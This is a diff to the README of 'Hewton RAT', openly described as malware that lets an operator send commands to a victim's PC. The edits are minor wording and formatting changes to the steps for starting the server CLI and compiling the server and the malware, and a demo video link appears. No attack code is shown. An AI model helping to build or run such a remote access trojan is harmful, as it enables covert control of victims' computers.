@@ -8,7 +8,7 @@ As said above, Hewton RAT is a remote access tool, so malware operator can manag
 
 Malware operator start server CLI, enter commands and the commands send to victim's PC
 
-You should run `python server.py` to start server CLI
+You should run `python server.py` or `server.exe` file to start server CLI
 
 Then you can use this commands:
 - *(0) Show server commands*
@@ -34,7 +34,7 @@ and 1 main class (***Backdoor***) on the ***client side***.
 You can check how it works on the video [link](https://youtu.be/JAEwzAu24ac)
 
 ## Compilation
-You should set up project variables in local_libs/env_vars.py file and change default values
+You should set up project variables in *local_libs/env_vars.py* file and change default values
 
 1. For server: `compile server`
 2. For malware: `compile malware`
